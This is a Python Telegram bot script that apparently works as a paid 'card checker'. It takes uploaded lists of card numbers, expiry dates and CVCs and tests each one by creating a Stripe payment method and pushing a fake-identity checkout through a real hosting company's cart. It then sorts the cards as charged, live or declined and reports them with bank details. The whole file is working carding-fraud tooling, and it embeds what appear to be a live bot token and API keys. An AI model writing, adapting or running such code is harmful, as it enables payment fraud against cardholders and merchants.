import os
import requests
from bs4 import BeautifulSoup
import telebot
from telebot import types
import random
import uuid
import re
import pycountry
import time
from faker import Faker

faker = Faker()
token = "7295082918:AAGdR8uzZkOIPDb9zREWa5kknUc7bARlmqk"
bot = telebot.TeleBot(token, parse_mode="HTML")

subscribers = ['852534338','1473050861'] #ايديك

@bot.message_handler(commands=["start"])
def start(message):
    if str(message.chat.id) not in subscribers:
        bot.reply_to(message, "انت لست مشترك بل بوت... المالك @M_T_H_T")
        return
    bot.reply_to(message, "Send The File Now \n ارسل الملف الان")

@bot.message_handler(content_types=["document"])
def main(message):
    if str(message.chat.id) not in subscribers:
        bot.reply_to(message, "انت لست مشترك بل بوت... المالك @M_T_H_T")
        return
    ch = 0
    live = 0
    dd = 0
    koko = bot.reply_to(message, "CHECKING STARTED BY BESHOO ✅...⌛").message_id
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)

    with open("combo.txt", "wb") as w:
        w.write(ee)

    try:
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)

            for line in lino:
                P = line.strip()
                n, mm, yy, cvc = map(str.strip, P.split("|"))
                aa = uuid.uuid4()
                bb = uuid.uuid4()
                no = faker.first_name()
                dodo = ''.join(random.choice("qwaszxcerdfvbtyghnmjkluiop0987654321") for i in range(5))
                xhot = no + dodo
                r = requests.get("https://my.hostarmada.com/cart.php")
                wd = r.cookies["WHMCSy551iLvnhYt7"]
                soup = BeautifulSoup(r.text, 'html.parser')
                plan_cta_div = soup.find('div', class_='plan-cta')
                link = plan_cta_div.find('a')['href']
                script_tag = soup.find('script', type='text/javascript').text
                tok = re.search(r"var csrfToken = '([^']*)'", script_tag).group(1)
                cok = {
                    'WHMCSy551iLvnhYt7': str(wd),
                    '_fbp': 'fb.1.1714479694826.1382353090',
                    '__zlcmid': '1LXmgR8OXrMsGwW',
                    '__stripe_mid': str(aa),
                    '__stripe_sid': str(bb),
                }
                hed = {
                    'authority': 'my.hostarmada.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
                    'cache-control': 'max-age=0',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://my.hostarmada.com',
                    'referer': str(link),
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Linux"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                }
                par = {
                    'a': 'add',
                    'pid': '1',
                    'domainselect': '1',
                }
                da = {
                    'token': str(tok),
                    'domainoption': 'register',
                    f'domainsregperiod[{xhot}.com]': '1',
                    'domains[]': f'{xhot}.com',
                }
                res = requests.post('https://my.hostarmada.com/cart.php', params=par, cookies=cok, headers=hed, data=da).text
                soup = BeautifulSoup(res, 'html.parser')
                rg = soup.find('script', type='text/javascript').text
                token = re.search(r"var csrfToken = '([^']*)'", rg).group(1)
                cor = {
                    '_fbp': 'fb.1.1714479694826.1382353090',
                    '__zlcmid': '1LXmgR8OXrMsGwW',
                    '__stripe_mid': str(aa),
                    '__stripe_sid': str(bb),
                    'WHMCSy551iLvnhYt7': str(wd),
                    '_ga': 'GA1.1.254413288.1714489037',
                    '_ga_MML13XH5B4': 'GS1.1.1714489036.1.0.1714489042.54.0.0',
                }
                hor = {
                    'authority': 'my.hostarmada.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
                    'referer': 'https://my.hostarmada.com/cart.php?a=view',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                }
                prm = {
                    'a': 'checkout',
                    'e': 'false',
                }
                response = requests.get('https://my.hostarmada.com/cart.php', params=prm, cookies=cor, headers=hor).text
                soup = BeautifulSoup(response, 'html.parser')
                script_tag = soup.find('script', string=lambda x: x and 'pk_live' in x)
                if script_tag:
                    pk_live_index = script_tag.string.find('pk_live')
                    pk_live = script_tag.string[pk_live_index:pk_live_index + 42]
                else:
                    pk_live = 'pk_live_sZwZsvPzNPvgqldQYmY5QWhE00B8Wlf3Tx'
                headers = {
                    'authority': 'api.stripe.com',
                    'accept': 'application/json',
                    'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'referer': 'https://js.stripe.com/',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                }
                data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid={aa}&sid={bb}&payment_user_agent=stripe.js%2Fd2c4996313%3B+stripe-js-v3%2Fd2c4996313%3B+split-card-element&referrer=https%3A%2F%2Fmy.hostarmada.com&time_on_page=109332&key={pk_live}&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQaN9NRZI4Vpoz8oE_MhpAf3sGSAP2ydXbMpwLkEZkpdR9frHZr63FCa9_ST4dPWCrohquHow6v53dOqN3tS3sU6Vs80roVQn5MlIUDk5-KtWwCYGrrQjPpZyI7Fa8Jt35HpFtkpdTLxo9UVX3Hi7omUbh8lKMeC6Qi2ZZo_K6xazAFRd_fUjxUGE_Z005aun57sp_uBsvfknQbZaox21CTrBkMIMox8XFcPxLYoXksaMd7xD0tsVMg-PH2WXo8hScm0se438rP8nHKNqeiBnznjfUA3lWQ-Xv9NsQESlcEM3EUPfk4sY45ITHS-N1EjBwlKoDKwyFHWVcXCdZmf_nGkcRxK_8VRpjdqbpcPEZyBtARTBMCwXmHSFSMpHn_Zid0Eo3DfHlj8QjJhil-HkdxLabCc9oRadNoxfcLrNzjwvUwUSadF8QjWY77jBFv6ZLsppgUNEXbo0dw2ge4ZBdj05Cn2wzNsOiTBT1RhvFPtdwXRPzWEYUN8rubkDInVOyDHmqVAsN-ZyV1QXY2rEacX1PvS24eckRvkL_9MH05F7khdnG8is0dk2xLbNiIqwyoxPc1MX0rGTqQ11k2lO_t76BQuRIarzs4yImDwafERtkNLQaO9Z1rF3FbT_voVpqlVyL72Dre8hBZKNG9R-C9o7AZqnK7Xwu3i1Pb5h1FLGBqucfiolCT9QPZDxoeWIvuk_jiSahUe3mQ3hQ9MNZJe-rYIqJfhNX7-Kt3A6mKSTFQTnT5CbOnR4tqCI095GPLJ7vQUarqRAPtB47d0x1d0CcYrevxlvunYfObtUSOvFiLRH082O5jiVHpeIIrd-SG_0bfIn51fT31t5vnokW7jkiSA6rQRCyr4DPDo5AHTQsZVN9KG9p8utYz4Pif3_nhDxFOQsBGRMpMk6bFHraofaVq0k6mnDRzQ65Zw5mksUosJMrIayAiPzP9_Wbl7fDFEk9tcmdBXwS7vHiNvsIq_ZfzRTo85PkUd8seDk-rPFcukyXi4mLudCkFwihtOExXZ3xVhNmAt0-NxFNF_d_x2390P35Oa_BpdAVnCzn2viNVYUDwTJ5q5igNCDo2pv8mdkGovZjp4ZYq_PFctq0nmYQBQCC-ePK287Aw2241lCv4O1m3vJZ0K9M_D9Gwnzi_ylYmxaDS8kDpLDoKeTzSyrdBGRuv4bBR4AMVWrVJyfxZKNOv3ODbynJxpFMuCLblCVTDrajWgLzdSuPZqZO6mq_TXrIUMJPsHICo1lvXN3U2n-HU935fqAI3dcHNDIo-EJJPPrs9JUzqEy1ehVcbiINoczP9wXW6WNzbwYp3wzJcQMEZZl0YjiueRRFeu5HFh2xCc9WF4N7uv3luUKBJ7xQXwNP7HMVJ_vHmdQHSey5gGFLnF3J6nr79y5ooIKche2s_N3brXhm9JyG9Y76LphjrfLCLqLLB532u45eRJH4-sznXXkDWKX8j-FCCcoF6XPoMzL89Aaf1lFgpDqWpnZpqQ-dfeJKu9kYEJSgOzbsMtyFEDDl5aOJo84VCZbGOpHIZVkErsQe0y3bfaU3VLHaG2Pd3gXmWxBwzzjUoUInpvm8W2ueVyvPuvR5CIfeMX9w-tFVRyjSIInl493gkeEUm5PnEAqrXFOqVyFraAyAPbhv1-t_SNdSdMjHoG7xQc1RepRATB-b-4Q1WPQ0bnnPr2NJxmAzAefLTzLIsmiUdoWCMO4tVm6bXUo9M490mXzw1legWPl-v42Vwk4cBuRE_8ku5qil6nxuNzOBzei7vQfe5ZgWjsC3wsVFDEtL8VZ54GuqifMbUwmuywev5EeE-xqk5kVIlyXC2jMnbH3aGAQbY2R94XfgFyO8kIXyzfHfIcZp1roGJkZ8JdsaVMTlAOv7x7h59eXb7R-zagp93T68WxHdut5-bahi7WjuxWp3jgU9tawBYidys1xxtMTNyJfBlWnLxF7bFGiYAjKBWnF9sOpA2k1EYluRhoTfwcpEHkw3a5Ab8FIYOw9bypmqZDWtYTgHE9E5QUDiYOpGfHwA4Ik5yXmgtJrtLtCV_-2FG6O_2XW8TVsA_JbY1Bek0iC0dfrB7tiKgGcLBk1BMTGe__7I7w2WXtp55Y9X_bVtw7yIHcUPA7Q9UmjcU5GmiPTLMsRC27BR2Hx6W_OBPEk_hJf2tRWIQzHk5S6N4nap7mJY7gKaRCCHoS0rmHLOg_jeccgO56X6YHEFlkdWVc4VwyfHiMI5e9q8m-o2V4cM5mMQfrqHNoYXJkX2lkzgMxg2-ia3KoMTk4ZDg3MjaicGQA.cna1qgk1Rcn5yX-aAKnnR2czAHWzrmZtIBLOFPpyiWQ'

                rr = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data).json()
                try:
                    id = rr['id']
                except KeyError:
                    id = 'pm_1P4APfKEzvleW5flXGL0re1p'

                no = faker.first_name().upper()
                mo = faker.first_name().upper()
                bb = 'qwaszxcerdfvbtyghnmjkluiop0987654321'
                hell = ''.join(random.choice(bb) for i in range(14))
                domin = random.choice(['@hotmail.com', '@aol.com', '@gmail.com', '@yahoo.com'])
                email = hell + domin
                cookies = {
                    '_fbp': 'fb.1.1714479694826.1382353090',
                    '__zlcmid': '1LXmgR8OXrMsGwW',
                    '__stripe_mid': str(aa),
                    '__stripe_sid': str(bb),
                    'WHMCSy551iLvnhYt7': str(wd),
                    '_ga': 'GA1.1.254413288.1714489037',
                    '_ga_MML13XH5B4': 'GS1.1.1714489036.1.0.1714489042.54.0.0',
                }
                hd = {
                    'authority': 'my.hostarmada.com',
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://my.hostarmada.com',
                    'referer': 'https://my.hostarmada.com/cart.php?a=checkout&e=false',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }
                dati = {
                    'token': str(token),
                    'submit': 'true',
                    'custtype': 'new',
                    'loginemail': '',
                    'loginpassword': '',
                    'firstname': str(no),
                    'lastname': str(mo),
                    'email': str(email),
                    'country-calling-code-phonenumber': [
                        '1',
                        '',
                    ],
                    'phonenumber': '501-234-6981',
                    'companyname': 'New York',
                    'address1': 'NA 2009',
                    'address2': '5FfG',
                    'city': 'New York',
                    'state': 'New York',
                    'postcode': '10001',
                    'country': 'US',
                    'contact': '',
                    'domaincontactfirstname': '',
                    'domaincontactlastname': '',
                    'domaincontactemail': '',
                    'country-calling-code-domaincontactphonenumber': '1',
                    'domaincontactphonenumber': '',
                    'domaincontactcompanyname': '',
                    'domaincontactaddress1': '',
                    'domaincontactaddress2': '',
                    'domaincontactcity': '',
                    'domaincontactstate': '',
                    'domaincontactpostcode': '',
                    'domaincontactcountry': 'US',
                    'domaincontacttax_id': '',
                    'password': 'Drahmed2006##$$',
                    'password2': 'Drahmed2006##$$',
                    'paymentmethod': 'stripe',
                    'ccinfo': 'new',
                    'ccdescription': '',
                    'marketingoptin': '1',
                    'accepttos': 'on',
                    'payment_method_id': str(id),
                }

                start_time = time.time()
                res = requests.post(
                    'https://my.hostarmada.com/index.php?rp=/stripe/payment/intent',
                    cookies=cookies,
                    headers=hd,
                    data=dati,
                )
                state = res.json()['warning']
                meet_headers = {
                    'Referer': 'https://bincheck.io/ar',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                }

                response = requests.get(f'https://bincheck.io/ar/details/{P[:6]}', headers=meet_headers)
                soup = BeautifulSoup(response.text, 'html.parser')

                table1 = soup.find('table', class_='w-full table-auto')
                rows1 = table1.find_all('tr')

                table2 = soup.find_all('table', class_='w-full table-auto')[1]
                rows2 = table2.find_all('tr')

                for row in rows1:
                    cells = row.find_all('td')
                    if len(cells) == 2:
                        cell1_text = cells[0].text.strip()
                        cell2_text = cells[1].text.strip()
                        if cell1_text == 'BIN/IIN':
                            bin_ = cell2_text
                        elif cell1_text == 'العلامة التجارية للبطاقة':
                            brand = cell2_text
                        elif cell1_text == 'نوع البطاقة':
                            card_type = cell2_text
                        elif cell1_text == 'تصنيف البطاقة':
                            card_level = cell2_text
                        elif cell1_text == 'اسم المصدر / البنك':
                            bank = cell2_text
                        elif cell1_text == 'المُصدِر / هاتف البنك':
                            bank_phone = cell2_text

                for row in rows2:
                    cells = row.find_all('td')
                    if len(cells) == 2:
                        cell1_text = cells[0].text.strip()
                        cell2_text = cells[1].text.strip()
                        if cell1_text == 'اسم الدولة ISO':
                            country_name = cells[1].text.strip()
                        elif cell1_text == 'رمز البلد ISO A2':
                            country_iso_a2 = cell2_text
                        elif cell1_text == 'ISO كود الدولة A3':
                            country_iso_a3 = cell2_text
                        elif cell1_text == 'علم الدولة':
                            country_flag = cells[1].find('img')['src']
                        elif cell1_text == 'عملة البلد ISO':
                            currency = cell2_text
                            country = pycountry.countries.get(name=country_name)
                            flag = country.flag
                            end_time = time.time()
                            duration = int(end_time - start_time)

                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"• {P} •", callback_data='u8')
                status = types.InlineKeyboardButton(f"• 𝗦𝗧𝗔𝗧𝗨𝗦 ➜ {state} •", callback_data='u8')
                cm3 = types.InlineKeyboardButton(f"• 𝗖𝗛𝗔𝗥𝗚𝗘 ✅ ➜ [ {ch} ] •", callback_data='x')
                cm4 = types.InlineKeyboardButton(f"• 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ ➜ [ {live} ] •", callback_data='x')
                cm5 = types.InlineKeyboardButton(f"• 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ ➜ [ {dd} ] •", callback_data='x')
                cm6 = types.InlineKeyboardButton(f"• 𝗧𝗢𝗧𝗔𝗟 👻 ➜ [ {total} ] •", callback_data='x')
                stop = types.InlineKeyboardButton(f"[ 𝐒𝐓𝐎𝐏 ]", callback_data='stop')
                mes.add(cm1, status, cm3, cm4, cm5, cm6,)
                bot.edit_message_text(chat_id=message.chat.id, message_id=koko,
                                      text='''WAITING MONEY ➜ @M_T_H_T ''', reply_markup=mes)
                if any(keyword in res.text for keyword in
                       ["live", "success", "Your card has insufficient funds", "insufficient funds",
                        "Payment success", "Thank you for your support.", "insufficient_funds",
                        "card has insufficient funds", "successfully",
                        "Your card does not support this type of purchase.",
                        "payment-successfully"]):
                    ch += 1
                    msg = f"""
◆ 𝐂𝐀𝐑𝐃  ➜ {P}
◆ 𝐑𝐞𝐩𝐨𝐧𝐬𝐞 ➜ CHARGE ✅
━━━━━━━━━━━━━━━━━
- 𝗕𝗜𝗡 ⇾ {P[:6]} 
- 𝗜𝗻𝗳𝗼 ⇾ {card_type} - {brand} - {card_level}
- 𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ {bank}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country_name} {flag}
- 𝐏𝐇𝐎𝐍𝐄 ⇾ {bank_phone}
- 𝐎𝐓𝐇𝐄𝐑 ⇾ {currency} - {country_iso_a2} - {country_iso_a3}
- 𝐓𝐢𝐦𝐞⇾{duration}s
━━━━━━━━━━━━━━━━━
◆ 𝐁𝐘: @M_T_H_T
                    """
                    bot.reply_to(message, msg)

                elif any(keyword in res.text for keyword in
                         ["Declined - Call Issuer", "Declinedll Issuer", "Your card was declined.",
                          "Your card has expired", "risk_threshold", "Error Processing Payment",
                          "Your card number is incorrect."]):
                    dd += 1

                elif any(keyword in res.text for keyword in
                         ["Your card's security code is incorrect.", "security code is invalid",
                          "incorrect_cvc", "security code is incorrect",
                          "Card Issuer Declined CVV", "Your card zip code is incorrect.",
                          "card's security code is incorrect"]):
                    live += 1
                    msg2 = f"""
◆ 𝐂𝐀𝐑𝐃  ➜ {P}
◆ 𝐑𝐞𝐩𝐨𝐧𝐬𝐞 ➜ Incorrect [CCN,CVV] ✅
━━━━━━━━━━━━━━━━━
- 𝗕𝗜𝗡 ⇾ {P[:6]} 
- 𝗜𝗻𝗳𝗼 ⇾ {card_type} - {brand} - {card_level}
- 𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ {bank}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country_name} {flag}
- 𝐏𝐇𝐎𝐍𝐄 ⇾ {bank_phone}
- 𝐎𝐓𝐇𝐄𝐑 ⇾ {currency} - {country_iso_a2} - {country_iso_a3}
- 𝐓𝐢𝐦𝐞 ⇾{duration}s
━━━━━━━━━━━━━━━━━
◆ 𝐁𝐘: @M_T_H_T
                    """
                    bot.reply_to(message, msg2)

                else:
                    dd += 1
                    msg3 = f"""          
◆ 𝐂𝐀𝐑𝐃  ➜ {P}
◆ 𝐑𝐞𝐩𝐨𝐧𝐬𝐞 ➜ {state}
━━━━━━━━━━━━━━━━━
- 𝗕𝗜𝗡 ⇾ {P[:6]} 
- 𝗜𝗻𝗳𝗼 ⇾ {card_type} - {brand} - {card_level}
- 𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ {bank}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country_name} {flag}
- 𝐏𝐇𝐎𝐍𝐄 ⇾ {bank_phone}
- 𝐎𝐓𝐇𝐄𝐑 ⇾ {currency} - {country_iso_a2} - {country_iso_a3}
- 𝐓𝐢𝐦𝐞 ⇾{duration}s
━━━━━━━━━━━━━━━━━
◆ 𝐁𝐘: @M_T_H_T
            """
                    bot.reply_to(message, msg3)

    except:
        state = "Dead❌"
        pass      
print('تم تشغيل البوت بنجاح ✅')
while True:
    try:
        bot.infinity_polling()
    except:
        pass